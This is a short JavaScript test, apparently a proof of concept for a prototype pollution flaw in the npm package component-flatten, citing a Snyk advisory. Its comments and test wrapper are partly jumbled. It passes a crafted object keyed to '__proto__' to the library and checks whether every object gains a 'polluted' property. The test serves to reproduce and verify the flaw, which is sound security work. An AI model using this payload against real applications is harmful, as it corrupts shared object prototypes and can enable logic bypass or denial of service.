// //snyk.io/vuln/SNYK-JS-COMPONENTFLATTEN-548907
// https: test("prototype pollution in component-flatten", () => {
console.log({}.polluted);

  const cf = require("component-flatten");
  let tree = { ref: "polluted", name: "__proto__" };
  cf(tree);

  if({}.polluted != undefined){
    console.log("yes")
  }else{
    console.log(undefined)
  }
  // expect({}.polluted).not.toBe(undefined);
// });
